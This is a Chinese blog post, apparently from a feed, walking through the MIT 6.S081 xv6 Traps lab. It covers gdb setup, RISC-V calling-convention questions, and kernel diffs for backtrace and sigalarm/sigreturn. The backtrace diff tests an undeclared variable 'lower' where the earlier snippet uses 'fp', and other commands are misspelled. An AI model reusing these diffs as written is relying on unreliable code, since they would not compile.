class="language-ini">add-auto-load-safe-path &lt;xv6项目的根目录>/.gdbinit</code></pre><ol start="4"><li>打开两个终端窗口（可以使用 tmux 进行分屏），都需要进入 xv6 根目录，第一个窗口输入 <code>make-qemu</code> 等待调试器连接，第二个窗口输入 <code>gdb-multiarch</code> 打开 <code>gdb</code>，如果前面配置正确，那么 <code>gdb</code> 并自动加载 <code>.gdbinit</code> 配置，与 <code>qemu</code> 连接，之后便可以开始正常调试了。</li></ol><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/gdb.png"></p><h1 id="RISC-V-assembly"><a href="#RISC-V-assembly" class="headerlink" title="RISC-V assembly"></a>RISC-V assembly</h1><p>一些有关 RISC-V 汇编的问题，最好先通过网上博客或手册简单了解一下 RISC-V 的基本指令。</p><p><strong>Q1:</strong> </p><blockquote><p>Which registers contain arguments to functions? For example, which register holds 13 in main’s call to <code>printf</code>?</p></blockquote><p><strong>A1:</strong> </p><p>可以参考 RISC-V 的 <em>calling convention</em>，<code>a0</code> - <code>a7</code>: 这些寄存器用于传递函数的前八个整数或指针类型的参数，如果超出这些寄存器的数量，超出的部分会存放在栈上。观察指令 <code>li  a2,13</code> 可知，13 作为 <code>printf</code> 的第二个参数，存放在寄存器 <code>a2</code> 中。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/reg.png"></p><p><strong>Q2:</strong></p><blockquote><p>Where is the call to function <code>f</code> in the assembly code for main? Where is the call to <code>g</code>? (Hint: the compiler may inline functions.)</p></blockquote><p><strong>A2:</strong> </p><p>调用函数 <code>f</code> 和函数 <code>g</code> 的代码被编译器优化，直接计算出了结果 12，作为 <code>printf</code> 的参数存入寄存器 <code>a1</code> 中：</p><pre class="language-assembly" data-language="assembly"><code class="language-assembly">26:   45b1                    li  a1,12</code></pre><p><strong>Q3:</strong></p><blockquote><p>At what address is the function <code>printf</code> located?</p></blockquote><p><strong>A3:</strong> </p><p>位于 0x638 地址处。</p><p><strong>Q4:</strong></p><blockquote><p>What value is in the register <code>ra</code> just after the <code>jalr</code> to <code>printf</code> in <code>main</code>?</p></blockquote><p><strong>A4:</strong> 参考 <a href="https://pdos.csail.mit.edu/6.828/2021/readings/riscv-calling.pdf">riscv-calling</a>，<code>ra</code> 用来存储函数调用的返回地址，因此 <code>ra</code> 的值为 <code>jalr    1544(ra)</code> 的后一条指令地址，即 0x38.</p><p><strong>Q5:</strong></p><blockquote><p>Run the following code.</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> <span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0x00646c72</span><span class="token punctuation">;</span><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"H%x Wo%s"</span><span class="token punctuation">,</span> <span class="token number">57616</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre><p>What is the output? <a href="http://web.cs.mun.ca/~michael/c/ascii-table.html">Here’s an ASCII table</a> that maps bytes to characters.</p><p>The output depends on that fact that the RISC-V is little-endian. If the RISC-V were instead big-endian what would you set <code>i</code> to in order to yield the same output? Would you need to change <code>57616</code> to a different value?</p><p><a href="http://www.webopedia.com/TERM/b/big_endian.html">Here’s a description of little- and big-endian</a> and <a href="http://www.networksorcery.com/enp/ien/ien137.txt">a more whimsical description</a>.</p></blockquote><p><strong>A5:</strong></p><ul><li><code>%x</code> 用于输出一个无符号十六进制整数。</li><li><code>%s</code> 用于输出一个字符指针所指向的字符串，直到遇到空字符<code>\0</code>为止。</li></ul><p>小端模式下，57616 的 十六进制表示为 e110，<code>&amp;i</code> 首地址开始的字节分别为 <code>0x72, 0x6c, 0x64, 0x0</code>，对应 ASCII 表中的字符为 <code>r, l, d</code>，因此最终输出结果为 <code>He110 World</code>.</p><p>若采取大端模式，<code>i</code> 的值应当替换为 <code>0x726c6400</code>，57616 的值无需改变，因为十六进制的书写规则并没有改变（高位在左，低位在右）。</p><p><strong>Q6:</strong></p><blockquote><p>In the following code, what is going to be printed after <code>&#39;y=&#39;</code>? (note: the answer is not a specific value.) Why does this happen?</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"x=%d y=%d"</span><span class="token punctuation">,</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span></code></pre></blockquote><p><strong>A6:</strong></p><p>关于可变参数的内容查看 《<em>C Programming Language 2nd Edition</em>》（K&amp;R）的 7.3 节 <em>Variable-length Argument Lists</em>.</p><p>简而言之，这样的操作将引发<strong>未定义行为</strong>，此时 <code>ap</code> 指向了一个未知的内存区域，并将该区域的数据以整型的形式输出。</p><h1 id="Backtrace"><a href="#Backtrace" class="headerlink" title="Backtrace"></a>Backtrace</h1><h2 id="思路"><a href="#思路" class="headerlink" title="思路"></a>思路</h2><p>思路其实很简单：对照 <a href="https://pdos.csail.mit.edu/6.828/2021/lec/l-riscv-slides.pdf">lecture notes</a> 给出的栈的结构，从当前栈帧的起始地址 <code>fp</code> 开始，<code>fp - 8</code> 的位置存放着当前函数调用的返回地址（上一次函数调用处的下一条指令地址），即我们 <strong>需要打印</strong> 的地址，<code>fp - 16</code> 的位置存放着上一次函数调用所在栈帧的起始地址，将该地址作为新的 <code>fp</code> 重复上述步骤即可。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/st.png"></p><p>关键问题是 <strong>什么时候停止</strong> ？可以看到上述 backtrace 的过程就好像是在遍历一个链表，当链表的 <code>next</code> 域为空指针时链表到达末尾，那 traceback 完成后<code>fp</code> 的值应该是什么？为了寻找这个问题的答案，我选择先不设置终止条件，让它一直向上搜索，最后发现，返回地址最终为一个很小的值，这个地址显然不是我们想要的，在此之前应该退出，即本次 traceback 的尽头是 0x80001c92.</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/noterm.png"></p><p>但打印出来的函数调用的返回地址似乎并没有什么规律，因此我又尝试将遍历过程中的栈帧起始地址 <code>fp</code> 打印出来，得到以下结果：</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/pfp.png"></p><p>结合提示：</p><blockquote><p>Xv6 allocates one page for each stack in the xv6 kernel at PAGE-aligned address.</p></blockquote><p>原因就很明显了，在打印第三个返回地址时，此时栈帧起始地址为 0x3fffffa000，注意该地址后 12 二进制数为 0，且页面大小为 4KB，因此该地址位于一个页面的起始地址。又因为 xv6 内核只为每个 <strong>内核栈</strong> 分配一个页面的存储空间，该页面的起始地址按页面大小对齐，所以此时已经到达一个内核栈的顶端，无需继续遍历。</p><p>弄清楚了这些，代码的编写就很简单了：</p><pre class="language-c" data-language="c"><code class="language-c"><span class="token keyword">void</span> <span class="token function">backtrace</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"backtrace:\n"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 fp <span class="token operator">=</span> <span class="token function">r_fp</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    uint64 top <span class="token operator">=</span> <span class="token function">PGROUNDUP</span><span class="token punctuation">(</span>fp<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">do</span> <span class="token punctuation">&#123;</span>        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"%p\n"</span><span class="token punctuation">,</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">8</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        fp <span class="token operator">=</span> <span class="token operator">*</span><span class="token punctuation">(</span>uint64 <span class="token operator">*</span><span class="token punctuation">)</span><span class="token punctuation">(</span>fp <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">&#125;</span> <span class="token keyword">while</span> <span class="token punctuation">(</span>fp <span class="token operator">&lt;</span> top<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// reach the top of kernel stack</span><span class="token punctuation">&#125;</span></code></pre><h2 id="代码"><a href="#代码" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff"><span class="token coord">--- a/kernel/defs.h</span><span class="token coord">+++ b/kernel/defs.h</span>@@ -80,6 +80,7 @@ int             pipewrite(struct pipe*, uint64, int);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void            printf(char*, ...);</span><span class="token prefix unchanged"> </span><span class="token line">void            panic(char*) __attribute__((noreturn));</span><span class="token prefix unchanged"> </span><span class="token line">void            printfinit(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">voidbacktrace(void); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// proc.c</span><span class="token prefix unchanged"> </span><span class="token line">int             cpuid(void);</span></span>diff --git a/kernel/printf.c b/kernel/printf.cindex e1347de..a068cbd 100644<span class="token coord">--- a/kernel/printf.c</span><span class="token coord">+++ b/kernel/printf.c</span>@@ -114,6 +114,23 @@ printf(char *fmt, ...)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    release(&amp;pr.lock);</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">void backtrace(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("backtrace:\n");</span><span class="token prefix inserted">+</span><span class="token line">uint64 fp = r_fp();</span><span class="token prefix inserted">+</span><span class="token line">uint64 top = PGROUNDUP(fp);</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">do &#123;</span><span class="token prefix inserted">+</span><span class="token line">printf("%p\n", *(uint64 *)(fp - 8));</span><span class="token prefix inserted">+</span><span class="token line">fp = *(uint64 *)(fp - 16);</span><span class="token prefix inserted">+</span><span class="token line">&#125; while (lower &lt; top);</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">void</span><span class="token prefix unchanged"> </span><span class="token line">panic(char *s)</span><span class="token prefix unchanged"> </span><span class="token line">&#123;</span></span>diff --git a/kernel/riscv.h b/kernel/riscv.hindex 1691faf..fae7bf3 100644<span class="token coord">--- a/kernel/riscv.h</span><span class="token coord">+++ b/kernel/riscv.h</span>@@ -331,6 +331,15 @@ sfence_vma()<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  asm volatile("sfence.vma zero, zero");</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span><span class="token prefix unchanged"> </span><span class="token line"></span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">static inline uint64</span><span class="token prefix inserted">+</span><span class="token line">r_fp()</span><span class="token prefix inserted">+</span><span class="token line">&#123;</span><span class="token prefix inserted">+</span><span class="token line">  uint64 x;</span><span class="token prefix inserted">+</span><span class="token line">  asm volatile("mv %0, s0" : "=r" (x) );</span><span class="token prefix inserted">+</span><span class="token line">  return x;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">#define PGSIZE 4096 // bytes per page</span><span class="token prefix unchanged"> </span><span class="token line">#define PGSHIFT 12  // bits of offset within a page</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex e8bcda9..f27c007 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -70,6 +70,7 @@ sys_sleep(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    sleep(&amp;ticks, &amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  &#125;</span><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  backtrace(); // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  return 0;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span></code></pre><h1 id="Alarm"><a href="#Alarm" class="headerlink" title="Alarm"></a>Alarm</h1><h2 id="思路-1"><a href="#思路-1" class="headerlink" title="思路"></a>思路</h2><p>目前为止感觉最复杂的一题，需要对 trap 机制有一个比较深入的理解，建议在上手之前先仔细阅读与 trap 有关的代码：<code>kernel/trampoline.S</code> 和 <code>kernel/trap.c</code>，这里也推荐一位博主写的两篇有关 xv6 的 trap 机制的博客：</p><p><a href="https://blog.csdn.net/zzy980511/article/details/130255251">6.S081——陷阱部分(一文读懂xv6系统调用)——xv6源码完全解析系列(5)</a></p><p><a href="https://blog.csdn.net/zzy980511/article/details/130642258">6.S081——补充材料——RISC-V架构中的异常与中断详解</a></p><h3 id="test0-invoke-handler"><a href="#test0-invoke-handler" class="headerlink" title="test0: invoke handler"></a>test0: invoke handler</h3><p>我们不妨按照提示的顺序来进行，不关注 <code>sys_sigreturn</code>，先把 <code>sys_sigalarm</code> 的功能实现。</p><p>实际上，<code>sys_sigalarm</code> 函数的功能很简单，只是简单地将用户态下传递的参数 <code>ticks</code> 和 <code>handler</code> 存入进程的 <code>struct proc</code> 结构体中。实现调用 <code>handler</code> 的操作需要在内核态下的 <code>usertrap</code> 中完成，具体来说，针对时钟中断导致的 trap 将在 <code>if(which_dev == 2)</code> 后的语句中被处理。有两个目标需要完成： <strong>定时</strong> 和 <strong>函数调用</strong> 。</p><p>定时的逻辑比较清楚，在 <code>struct proc</code> 中添加变量 <code>ticksum</code>，代表从上次 <code>handler</code> 处理完成开始进程累计的时钟中断次数，该变量在进程初始化时设置为 0，随后每次遇到时钟中断，都自增 1，如果自增后的值达到了设定的间隔 <code>ticks</code>，则将其复位为 0，调用 <code>handler</code> 函数。</p><p>函数调用是一个需要考虑的问题，这里不能直接利用函数指针 <code>handler</code> 进行函数调用，因为 <code>handler</code> 指向的函数位于用户空间下，而 <code>usertrap</code> 位于内核态下，页表的地址映射不同，无法直接根据用户空间下的虚拟地址进行寻址（直接调用引发的错误如下图所示），需要在本次中断结束返回到用户态之后执行。因此正确的做法应该是设置进程 <code>struct proc</code> 的 <code>epc</code> 寄存器为函数指针 <code>handler</code>，这样在中断处理完成，进程回到用户态并被 CPU 调度执行后，寄存器 <code>pc</code> 将被设置预先保存的 <code>epc</code> 的值，这样函数 <code>handler</code> 就被成功调度执行了。至此，test0 应该成功通过。</p><p><img src="/2024/07/06/MIT6.s081-2021-Lab%20Traps/nil.png"></p><p>在进入到 test1&amp;2 之前，有必要说一说我的一些思考：在上面的讨论中，我们知道内核无法直接根据函数指针 <code>handler</code> 的值进行用户空间函数的调用，那能否在内核态下根据进程的用户态页表和给定的虚拟地址，利用软件地址转换机制（<code>vm.c</code> 中的 <code>walkaddr</code> 函数）来将用户空间的虚拟地址转换为物理地址进行寻址呢（这也是我最开始的想法）？答案是不行，因为即便是在内核态下，程序中的地址仍然是虚拟地址，也就是说即便知道用户态函数实际存储的物理地址，我们也只有在 <strong>给出一个虚拟地址，该虚拟地址经过内核页表地址转换之后，刚好得到了正确的物理地址，</strong> 才可能成功。而实际上，尽管内核 <code>KERNBASE</code> 到 <code>PHYSTOP</code> 地址都是直接映射，但内核页表中可能并没有所需要的页表项，因此，这并不会成功。</p><h3 id="test1-test2-resume-interrupted-code"><a href="#test1-test2-resume-interrupted-code" class="headerlink" title="test1/test2(): resume interrupted code"></a>test1/test2(): resume interrupted code</h3><p>test1 的目标是，存储和恢复中断处理前后的寄存器状态。那么问题就来了：为什么需要存储这些寄存器？需要存储哪些寄存器？</p><p>其实最开始，我是有些纠结寄存器状态的存储目的是什么，认为可能是与内核态和用户态切换有关，但仔细想想，这部分的工作应该是由 <code>trampoline.S</code> 和 <code>usertrapret</code> 来完成的，那么为什么还需要存储和恢复寄存器？</p><p>事实上，在系统未关闭中断的情况下，时钟中断可能在程序执行的任何时刻发生，且在返回到原程序位置继续执行之前还需要执行预先设定好的 <code>handler</code> 函数，那么寄存器状态的保存将是必要的。一方面在执行 <code>handler</code> 函数期间，如果 <code>handler</code> 函数包含一些对局部变量的处理，那么通用寄存器的值将会发生改变，从而使得中断返回时程序的执行结果与预期不符；另一方面，由于 <code>epc</code> 的值被手动改变，如果执行完 <code>handler</code> 之后不恢复中断发生时的保存的 <code>pc</code> 值，那么 <code>pc</code> 将会指向 <code>handler</code> 函数末尾的下一条指令，中断因此无法正常返回。 简单来说，这部分的操作相当于手动模拟了 <strong>线程</strong> 的切换。</p><p>另一个问题是：需要存储哪些寄存器？好吧，在解决这个 Lab 时我其实偷了点懒，没有去仔细琢磨，只是简单地将整个 <code>trapframe</code> 中所有的寄存器都保存下来。但根据上面的讨论，再结合 RISC-V 的 <em>calling convention</em>，应该不难得出答案。</p><p>最后的 test2 就比较简单了，目标是：</p><blockquote><p>Prevent re-entrant calls to the handler—-if a handler hasn’t returned yet, the kernel shouldn’t call it again.</p></blockquote><p>解决的办法有很多，可以额外在 <code>strcut proc</code> 添加一个变量，用来表示进程当前是否正处在处理 <code>handler</code> 的过程中，如果是，则不进行 <code>ticksum</code> 的自增操作。这里我采用了一点 <strong>小技巧</strong> ：不添加额外的变量，而是在处理 <code>handler</code> 前将 <code>ticksum</code> 置为负数，并在自增前判断 <code>ticksum</code> 是否非负，在 <code>sys_sigreturn</code> 时再将它置为 0，本质上与添加变量的操作大差不差。</p><h2 id="代码-1"><a href="#代码-1" class="headerlink" title="代码"></a>代码</h2><pre class="language-diff" data-language="diff"><code class="language-diff">diff --git a/Makefile b/Makefileindex 7a7e380..bc4d47a 100644<span class="token coord">--- a/Makefile</span><span class="token coord">+++ b/Makefile</span>@@ -188,6 +188,7 @@ UPROGS=\<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">$U/_grind\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_wc\</span><span class="token prefix unchanged"> </span><span class="token line">$U/_zombie\</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">$U/_alarmtest\</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span></span>diff --git a/kernel/proc.c b/kernel/proc.cindex 22e7ce4..80096f7 100644<span class="token coord">--- a/kernel/proc.c</span><span class="token coord">+++ b/kernel/proc.c</span>@@ -119,6 +119,7 @@ allocproc(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">found:</span><span class="token prefix unchanged"> </span><span class="token line">  p->pid = allocpid();</span><span class="token prefix unchanged"> </span><span class="token line">  p->state = USED;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = 0; // here</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  // Allocate a trapframe page.</span><span class="token prefix unchanged"> </span><span class="token line">  if((p->trapframe = (struct trapframe *)kalloc()) == 0)&#123;</span></span>diff --git a/kernel/proc.h b/kernel/proc.hindex f6ca8b7..c1d5a23 100644<span class="token coord">--- a/kernel/proc.h</span><span class="token coord">+++ b/kernel/proc.h</span>@@ -105,4 +105,10 @@ struct proc &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  struct file *ofile[NOFILE];  // Open files</span><span class="token prefix unchanged"> </span><span class="token line">  struct inode *cwd;           // Current directory</span><span class="token prefix unchanged"> </span><span class="token line">  char name[16];               // Process name (debugging)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  int ticks;         // here</span><span class="token prefix inserted">+</span><span class="token line">  void (*handler)();</span><span class="token prefix inserted">+</span><span class="token line">  int ticksum;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  struct trapframe strapframe;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span></span>diff --git a/kernel/syscall.c b/kernel/syscall.cindex c1b3670..d4e5585 100644<span class="token coord">--- a/kernel/syscall.c</span><span class="token coord">+++ b/kernel/syscall.c</span>@@ -104,6 +104,8 @@ extern uint64 sys_unlink(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_wait(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_write(void);</span><span class="token prefix unchanged"> </span><span class="token line">extern uint64 sys_uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigalarm(void); // here</span><span class="token prefix inserted">+</span><span class="token line">extern uint64 sys_sigreturn(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">static uint64 (*syscalls[])(void) = &#123;</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_fork]    sys_fork,</span></span>@@ -127,6 +129,8 @@ static uint64 (*syscalls[])(void) = &#123;<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">[SYS_link]    sys_link,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_mkdir]   sys_mkdir,</span><span class="token prefix unchanged"> </span><span class="token line">[SYS_close]   sys_close,</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">[SYS_sigalarm]  sys_sigalarm,  // here</span><span class="token prefix inserted">+</span><span class="token line">[SYS_sigreturn] sys_sigreturn,</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">&#125;;</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">void</span></span>diff --git a/kernel/syscall.h b/kernel/syscall.hindex bc5f356..a040610 100644<span class="token coord">--- a/kernel/syscall.h</span><span class="token coord">+++ b/kernel/syscall.h</span><span class="token coord">@@ -20,3 +20,5 @@</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">#define SYS_link   19</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_mkdir  20</span><span class="token prefix unchanged"> </span><span class="token line">#define SYS_close  21</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigalarm  22  // here</span><span class="token prefix inserted">+</span><span class="token line">#define SYS_sigreturn 23</span></span>diff --git a/kernel/sysproc.c b/kernel/sysproc.cindex f27c007..ee859ed 100644<span class="token coord">--- a/kernel/sysproc.c</span><span class="token coord">+++ b/kernel/sysproc.c</span>@@ -96,3 +96,28 @@ sys_uptime(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">  release(&amp;tickslock);</span><span class="token prefix unchanged"> </span><span class="token line">  return xticks;</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigalarm(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">if (argint(0, &amp;(p->ticks)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">if (argaddr(1, (uint64 *)&amp;(p->handler)) &lt; 0) &#123;</span><span class="token prefix inserted">+</span><span class="token line">return -1;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">uint64 sys_sigreturn(void) &#123;</span><span class="token prefix inserted">+</span><span class="token line">struct proc *p = myproc();</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">// restore registers</span><span class="token prefix inserted">+</span><span class="token line">memmove(p->trapframe, &amp;(p->strapframe), sizeof(p->strapframe));</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">p->ticksum = 0;</span><span class="token prefix inserted">+</span><span class="token line">return 0;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span>diff --git a/kernel/trap.c b/kernel/trap.cindex a63249e..447e6d8 100644<span class="token coord">--- a/kernel/trap.c</span><span class="token coord">+++ b/kernel/trap.c</span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span></span>@@ -77,8 +77,17 @@ usertrap(void)<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    exit(-1);</span><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  // give up the CPU if this is a timer interrupt.</span></span><span class="token deleted-sign deleted"><span class="token prefix deleted">-</span><span class="token line">  if(which_dev == 2)</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  if(which_dev == 2) &#123;</span><span class="token prefix inserted">+</span><span class="token line">// here</span><span class="token prefix inserted">+</span><span class="token line">if (p->ticks > 0 &amp;&amp; p->ticksum >= 0 &amp;&amp; ++(p->ticksum) >= p->ticks) &#123;</span><span class="token prefix inserted">+</span><span class="token line">  // save registers</span><span class="token prefix inserted">+</span><span class="token line">  memmove(&amp;(p->strapframe), p->trapframe, sizeof(p->strapframe));</span><span class="token prefix inserted">+</span><span class="token line"></span><span class="token prefix inserted">+</span><span class="token line">  p->ticksum = -1; // prevent re-entrant calls to the handler</span><span class="token prefix inserted">+</span><span class="token line">  p->trapframe->epc = (uint64)p->handler;</span><span class="token prefix inserted">+</span><span class="token line">&#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">    yield();</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">  &#125;</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">  usertrapret();</span><span class="token prefix unchanged"> </span><span class="token line">&#125;</span></span>diff --git a/user/user.h b/user/user.hindex b71ecda..422a4c1 100644<span class="token coord">--- a/user/user.h</span><span class="token coord">+++ b/user/user.h</span>@@ -23,6 +23,8 @@ int getpid(void);<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">char* sbrk(int);</span><span class="token prefix unchanged"> </span><span class="token line">int sleep(int);</span><span class="token prefix unchanged"> </span><span class="token line">int uptime(void);</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">int sigalarm(int ticks, void (*handler)()); // here</span><span class="token prefix inserted">+</span><span class="token line">int sigreturn(void);</span></span><span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line"></span><span class="token prefix unchanged"> </span><span class="token line">// ulib.c</span><span class="token prefix unchanged"> </span><span class="token line">int stat(const char*, struct stat*);</span></span>diff --git a/user/usys.pl b/user/usys.plindex 01e426e..84c6784 100755<span class="token coord">--- a/user/usys.pl</span><span class="token coord">+++ b/user/usys.pl</span>@@ -36,3 +36,5 @@ entry("getpid");<span class="token unchanged"><span class="token prefix unchanged"> </span><span class="token line">entry("sbrk");</span><span class="token prefix unchanged"> </span><span class="token line">entry("sleep");</span><span class="token prefix unchanged"> </span><span class="token line">entry("uptime");</span></span><span class="token inserted-sign inserted"><span class="token prefix inserted">+</span><span class="token line">entry("sigalarm"); # here</span><span class="token prefix inserted">+</span><span class="token line">entry("sigreturn");</span></span></code></pre>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;使用gdb调试xv6内核&quot;&gt;&lt;a href=&quot;#使用gdb调试xv6内核&quot; class=&quot;headerlink&quot; title=&quot;使用gdb调试xv6内核&quot;&gt;&lt;/a&gt;使用gdb调试xv6内核&lt;/h1&gt;&lt;p&gt;从最近两个 Lab 开始，代码逻辑的复杂度明显上升，对内核进</summary>
      
    
    
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/categories/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    
    <category term="经验" scheme="http://lordaeronesz.github.io/tags/%E7%BB%8F%E9%AA%8C/"/>
    
    <category term="操作系统" scheme="http://lordaeronesz.github.io/tags/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/"/>
    
    <category term="xv6" scheme="http://lordaeronesz.github.io/tags/xv6/"/>
    
  </entry>
  
  <entry>
    <title>MIT6.s081 2021 Lab Page tables</title>
    <link href="http://lordaeronesz.github.io/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/"/>
    <id>http://lordaeronesz.github.io/2024/07/01/MIT6.s081-2021-Lab%20Page%20tables/</id>
    <published>2024-07-01T03:45:11.000Z</published>
    <updated>2024-07-07T08:04:58.125Z</updated>
    
